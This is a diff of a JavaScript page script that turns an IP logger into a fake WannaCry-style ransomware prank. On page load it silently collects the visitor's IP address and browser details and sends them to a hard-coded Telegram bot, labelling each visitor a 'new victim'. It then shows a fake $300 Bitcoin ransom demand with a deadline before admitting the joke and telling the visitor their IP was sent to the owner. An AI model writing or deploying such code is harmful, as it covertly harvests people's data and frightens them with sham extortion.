@@ -1,14 +1,10 @@
 // ============================================
-// IP LOGGER + TELEGRAM BOT
+// IP LOGGER + TELEGRAM BOT (WannaCry Style)
 // ============================================
 
-// SEUS DADOS AQUI (já preenchidos!)
-const BOT_TOKEN = "8819910333:AAHJFHDsJKpfkQuAGwlhsWlOPuuUXl948A4";
+const BOT_TOKEN = "8819910333:AAGxrE0I0KQy4DJtmJg5sGIWQqYBfOpPb1w";
 const CHAT_ID = "8551438856";
 
-// ============================================
-// FUNÇÃO PARA PEGAR IP
-// ============================================
 async function getIP() {
     try {
         const response = await fetch('https://api.ipify.org?format=json');
@@ -19,11 +15,8 @@ async function getIP() {
     }
 }
 
-// ============================================
-// FUNÇÃO PARA PEGAR DADOS DO NAVEGADOR
-// ============================================
 function getBrowserData() {
-    const data = {
+    return {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
@@ -34,15 +27,11 @@ function getBrowserData() {
         url: window.location.href,
         timestamp: new Date().toLocaleString('pt-BR')
     };
-    return data;
 }
 
-// ============================================
-// FUNÇÃO PARA ENVIAR PRO TELEGRAM
-// ============================================
 async function sendToTelegram(ip, browserData) {
     const message = `
-🕵️‍♂️ **NOVA VÍTIMA CAPTURADA**
+🕵️‍♂️ **NOVA VÍTIMA CAPTURADA** 💀
 
 🌐 **IP:** ${ip}
 📍 **Localização:** https://ipinfo.io/${ip}
@@ -57,16 +46,15 @@ async function sendToTelegram(ip, browserData) {
 📎 **URL:** ${browserData.url}
 ⏱️ **Data/Hora:** ${browserData.timestamp}
 ━━━━━━━━━━━━━━━━━━━
+💀 **Ransomware WannaCry Style**
     `;
 
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    
+
     try {
         const response = await fetch(url, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
@@ -74,35 +62,49 @@ async function sendToTelegram(ip, browserData) {
                 disable_web_page_preview: true
             })
         });
-        
+
+        const statusEl = document.getElementById('status');
         if (response.ok) {
-            document.getElementById('status').textContent = '✅ Sucesso!';
-            document.getElementById('status').style.color = '#00ff88';
+            statusEl.textContent = '✅ Decryption key sent successfully!';
+            statusEl.style.color = '#00ff41';
         } else {
-            document.getElementById('status').textContent = '❌ Erro ao enviar';
+            statusEl.textContent = '❌ Failed to connect to server';
+            statusEl.style.color = '#ff0000';
         }
     } catch {
-        document.getElementById('status').textContent = '❌ Erro de conexão';
+        document.getElementById('status').textContent = '❌ Network error';
+        document.getElementById('status').style.color = '#ff0000';
     }
 }
 
-// ============================================
-// EXECUÇÃO PRINCIPAL
-// ============================================
 async function main() {
-    document.getElementById('status').textContent = '📡 Coletando dados...';
-    
+    const loading = document.getElementById('loading');
+    const status = document.getElementById('status');
+
+    loading.style.display = 'block';
+    status.textContent = '🔐 Collecting system data...';
+
     const ip = await getIP();
     const browserData = getBrowserData();
-    
-    document.getElementById('status').textContent = '📤 Enviando...';
+
+    status.textContent = '📤 Sending to decryption server...';
     await sendToTelegram(ip, browserData);
-    
-    // Redireciona pra algum lugar (opcional)
-    // setTimeout(() => {
-    //     window.location.href = 'https://www.google.com';
-    // }, 3000);
+
+    setTimeout(() => {
+        loading.style.display = 'none';
+    }, 3500);
 }
 
-// RODA O SCRIPT
-main();
+function checkPayment() {
+    alert('💰 Payment not detected!\n\nTry sending exactly $300 in Bitcoin to:\n1T5p7UMMngoj1plMvkpHjicRdfJNXj8LrLn\n\n⏱️ You have 2 days remaining.');
+}
+
+function decrypt() {
+    alert('🔓 Decrypting files...\n\nJust kidding! 😂\nYour files are safe. This is a test.\n\nBut your IP was sent to the owner! 👀');
+}
+
+function aboutBitcoin() {
+    alert('₿ Bitcoin is a cryptocurrency.\n\nCurrent price: ~$60,000 USD\n\nSend $300 worth to:\n1T5p7UMMngoj1plMvkpHjicRdfJNXj8LrLn\n\n⏰ Hurry up! Time is running out!');
+}
+
+document.addEventListener('DOMContentLoaded', main);
